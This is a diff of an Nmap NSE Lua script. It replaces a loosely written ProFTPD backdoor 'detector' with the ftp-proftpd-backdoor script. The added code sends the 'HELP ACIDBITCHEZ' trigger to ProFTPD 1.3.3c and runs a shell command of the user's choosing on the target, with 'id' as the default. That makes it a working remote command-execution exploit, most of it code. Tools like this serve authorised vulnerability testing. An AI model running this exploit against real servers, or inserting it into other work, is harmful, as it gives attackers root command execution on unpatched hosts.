@@ -1,228 +1,128 @@
-local stdnse = require "stdnse"
+local ftp = require "ftp"
 local nmap = require "nmap"
 local shortport = require "shortport"
+local stdnse = require "stdnse"
+
+-- -*- mode: lua -*-
+-- vim: set filetype=lua :
+
+description = [[
+Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID
+45150. This script attempts to exploit the backdoor using the innocuous
+<code>id</code> command by default, but that can be changed with the
+<code>ftp-proftpd-backdoor.cmd</code> script argument.
+]]
+
+---
+-- @usage
+-- nmap --script ftp-proftpd-backdoor -p 21 <host>
+--
+-- @args ftp-proftpd-backdoor.cmd Command to execute in shell (default is
+--       <code>id</code>).
+--
+-- @output
+-- PORT   STATE SERVICE
+-- 21/tcp open  ftp
+-- | ftp-proftpd-backdoor:
+-- |   This installation has been backdoored.
+-- |   Command: id
+-- |   Results: uid=0(root) gid=0(wheel) groups=0(wheel)
+-- |_
+
+author = "Mak Kolybabi"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+categories = {"exploit", "intrusive", "malware", "vuln"}
 
 
+local CMD_FTP = "HELP ACIDBITCHEZ"
+local CMD_SHELL = "id"
 
--- Fast-path bindings for the stdlib and nmap API used by this script.
--- Kept strict-mode safe: every name below is a declared local.
-local format = string.format
-local lower = string.lower
-local upper = string.upper
-local byte = string.byte
-local sub = string.sub
-local match = string.match
-local gmatch = string.gmatch
-local gsub = string.gsub
-local find = string.find
-local rep = string.rep
-local char = string.char
-local concat = table.concat
-local insert = table.insert
-local remove = table.remove
-local sort = table.sort
-local move = table.move
-local tostring = tostring
-local tonumber = tonumber
-local type = type
-local pcall = pcall
-local pairs = pairs
-local ipairs = ipairs
-local unpack = table.unpack
-local setmetatable = setmetatable
-local getmetatable = getmetatable
-local error = error
-local select = select
+portrule = function (host, port)
+  -- Check if version detection knows what FTP server this is.
+  if port.version.product ~= nil and port.version.product ~= "ProFTPD" then
+    return false
+  end
 
-local clock = nmap.clock
-local msleep = nmap.msleep
+  -- Check if version detection knows what version of FTP server this is.
+  if port.version.version ~= nil and port.version.version ~= "1.3.3c" then
+    return false
+  end
 
--- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
-local sleep = function(seconds)
-    return nmap.msleep(math.max(0, math.floor(seconds * 1000)))
+  return shortport.port_or_service(21, "ftp")(host, port)
 end
-
-local strsplit = function(sep, str, max)
-    local out, pos, n = {}, 1, 0
-    if str == nil then return out end
-    while true do
-        if max and n >= max - 1 then
-            out[#out + 1] = sub(str, pos)
-            return out
-        end
-        local s, e = find(str, sep, pos)
-        if not s then
-            out[#out + 1] = sub(str, pos)
-            return out
-        end
-        if e < pos then e = pos end
-        out[#out + 1] = sub(str, pos, s - 1)
-        pos = e + 1
-        n = n + 1
-        if pos > #str then
-            out[#out + 1] = ""
-            return out
-        end
-    end
-end
-
-local format_output = stdnse.format_output
-local output_table = stdnse.output_table
-
-description = [[Detects ProFTPD 1.3.3b backdoor (CVE-2010-4221) via crafted ACCT command and version fingerprinting.]]
-author = "HackIT Framework"
-license = "HackIT Framework — Internal Use Only"
-categories = {"vuln", "safe"}
-
-portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.service == "ftp" or port.number == 21) end
-
-local backdoor_commands = {
-  "ACCT HackIT_Test",
-  "ACCT HackIT",
-  "ACCT id",
-  "ACCT /bin/echo HackIT",
-}
 
 action = function(host, port)
-  local ok, result = pcall(function()
-    local findings = {}
-    local banner_str = ""
-    local ftpd_version = nil
+  local cmd, err, line, req, resp, results, sock, status
 
-    local sock = new_socket()
-    sock:set_timeout(8000)
-    local status = sock:connect(host.ip, port.number)
-    if not status then
-      local result = output_table()
-      result.cve = "CVE-2010-4221 (ProFTPD Backdoor)"
-      result.severity = "MEDIUM"
-      result.vulnerable = false
-      result.detail = "Connection failed"
-      result.error = true
-      return result
-    end
-
-    local banner, banner_err = sock:receive_buf("\n", 3)
-    if not banner then sock:close()
-      local result = output_table()
-      result.cve = "CVE-2010-4221"
-      result.severity = "MEDIUM"
-      result.vulnerable = false
-      result.detail = "No FTP banner"
-      return result
-    end
-
-    banner_str = gsub(banner, "\r?\n", ""):gsub("%s+$", "")
-    ftpd_version = match(banner_str, "ProFTPD ([%d%.]+[a-z]*)")
-    local pureftpd = match(banner_str, "Pure%-FTPD")
-    local vsftpd = match(banner_str, "vsFTPd")
-    local server_type = "unknown"
-    if ftpd_version then
-      server_type = "ProFTPD " .. ftpd_version
-    elseif pureftpd then
-      server_type = "Pure-FTPD"
-    elseif vsftpd then
-      server_type = "vsFTPd"
-    end
-
-    insert(findings, {check = "FTP banner", detail = banner_str, severity = "INFO"})
-
-    sock:send("USER anonymous\r\n")
-    local rcv = sock:receive_buf("\n", 3)
-    if rcv and match(rcv, "331") then
-      insert(findings, {check = "Anonymous login", detail = "Anonymous login allowed", severity = "MEDIUM"})
-    end
-
-    sock:send("PASS test@test.com\r\n")
-    rcv = sock:receive_buf("\n", 3)
-
-    if rcv and (match(rcv, "230") or match(rcv, "202")) then
-      insert(findings, {check = "Login success", detail = "Authenticated successfully", severity = "INFO"})
-
-      for _, cmd in ipairs(backdoor_commands) do
-        local cmd_sock = new_socket()
-        cmd_sock:set_timeout(8000)
-        local ok_cmd = cmd_sock:connect(host.ip, port.number)
-        if ok_cmd then
-          cmd_sock:receive_buf("\n", 3)
-          cmd_sock:send("USER anonymous\r\n")
-          cmd_sock:receive_buf("\n", 3)
-          cmd_sock:send("PASS test@test.com\r\n")
-          cmd_sock:receive_buf("\n", 3)
-          cmd_sock:send(cmd .. "\r\n")
-          local cmd_rcv, cmd_err = cmd_sock:receive_buf("\n", 3)
-          if cmd_rcv then
-            local resp = gsub(cmd_rcv, "\r?\n", "")
-            if match(resp, "HackIT") or match(resp, "uid=") or match(resp, "root") or match(resp, "nobody") then
-              insert(findings, {
-                check = ("Backdoor via %s"):format(cmd),
-                detail = ("Command executed: %s"):format(resp),
-                severity = "CRITICAL",
-              })
-            elseif match(resp, "211") or match(resp, "230") or match(resp, "202") then
-              if match(cmd, "ACCT") then
-                insert(findings, {
-                  check = ("ACCT command response"),
-                  detail = ("ACCT accepted: %s"):format(resp),
-                  severity = "HIGH",
-                })
-              end
-            end
-          end
-          cmd_sock:send("QUIT\r\n")
-          cmd_sock:close()
-        end
-      end
-    end
-
-    sock:send("SYST\r\n")
-    rcv = sock:receive_buf("\n", 3)
-    if rcv then
-      insert(findings, {check = "SYST response", detail = gsub(rcv, "\r?\n", ""), severity = "INFO"})
-    end
-
-    sock:send("QUIT\r\n")
-    sock:close()
-
-    if ftpd_version then
-      local major, minor, patch = match(ftpd_version, "(%d+)%.(%d+)%.(%d+)([a-z]*)")
-      if major and minor and patch then
-        local full_ver = tonumber(major) * 10000 + tonumber(minor) * 100 + tonumber(patch) + (({b = 0, c = 1, d = 2})[patch or ""] or 0)
-        if full_ver <= 10303 then
-          insert(findings, {check = "ProFTPD version", detail = ("ProFTPD %s - known vulnerable version (CVE-2010-4221)"):format(ftpd_version), severity = "CRITICAL"})
-        end
-      end
-    end
-
-    local max_severity = "LOW"
-    for _, f in ipairs(findings) do
-      local order = {CRITICAL = 4, HIGH = 3, MEDIUM = 2, LOW = 1, INFO = 0}
-      if (order[f.severity] or 0) > (order[max_severity] or 0) then
-        max_severity = f.severity
-      end
-    end
-
-    local result = output_table()
-    result.cve = "CVE-2010-4221 (ProFTPD Backdoor)"
-    result.severity = max_severity
-    result.vulnerable = max_severity ~= "LOW" and max_severity ~= "INFO"
-    result.banner = banner_str
-    result.version = ftpd_version or "unknown"
-    result.server_type = server_type
-    result.detail = (result.vulnerable) and "ProFTPD backdoor indicators found" or "No ProFTPD backdoor detected"
-    for i, f in ipairs(findings) do
-      result[("finding_%d"):format(i)] = ("[%s] %s: %s"):format(f.severity, f.check, f.detail)
-    end
-    return result
-  end)
-  if not ok then
-    local result = output_table()
-    result.cve = "CVE-2010-4221"
-    result.severity = "MEDIUM"
-    result.vulnerable = false
-    result.detail = "Error during scan: " .. tostring(result)
-    result.error = true
-    return result
+  -- Get script arguments.
+  cmd = stdnse.get_script_args("ftp-proftpd-backdoor.cmd")
+  if not cmd then
+    cmd = CMD_SHELL
   end
-  return result
+
+  -- Create socket.
+  sock = nmap.new_socket("tcp")
+  sock:set_timeout(5000)
+  status, err = sock:connect(host, port, "tcp")
+  if not status then
+    stdnse.debug1("Can't connect: %s", err)
+    sock:close()
+    return
+  end
+
+  -- Read banner.
+  local buffer = stdnse.make_buffer(sock, "\r?\n")
+  local code, message = ftp.read_reply(buffer)
+  if not code then
+    stdnse.debug1("Can't read banner: %s", message)
+    sock:close()
+    return
+  end
+
+  -- Check version.
+  if not message:match("ProFTPD 1.3.3c") then
+    stdnse.debug1("This version is not known to be backdoored.")
+    return
+  end
+
+  -- Send command to escalate privilege.
+  status, err = sock:send(CMD_FTP .. "\r\n")
+  if not status then
+    stdnse.debug1("Failed to send privilege escalation command: %s", err)
+    sock:close()
+    return
+  end
+
+  -- Check if escalation worked.
+  code, message = ftp.read_reply(buffer)
+  if code and code == 502 then
+    stdnse.debug1("Privilege escalation failed: %s", message)
+    sock:close()
+    return
+  end
+
+  -- Send command(s) to shell.
+  status, err = sock:send(cmd .. ";\r\n")
+  if not status then
+    stdnse.debug1("Failed to send shell command(s): %s", err)
+    sock:close()
+    return
+  end
+
+  -- Check for an error from command.
+  status, resp = sock:receive()
+  if not status then
+    stdnse.debug1("Can't read command response: %s", resp)
+    sock:close()
+    return
+  end
+
+  -- Summarize the results.
+  results = {
+    "This installation has been backdoored.",
+    "Command: " .. CMD_SHELL,
+    "Results: " .. resp
+  }
+
+  return stdnse.format_output(true, results)
 end
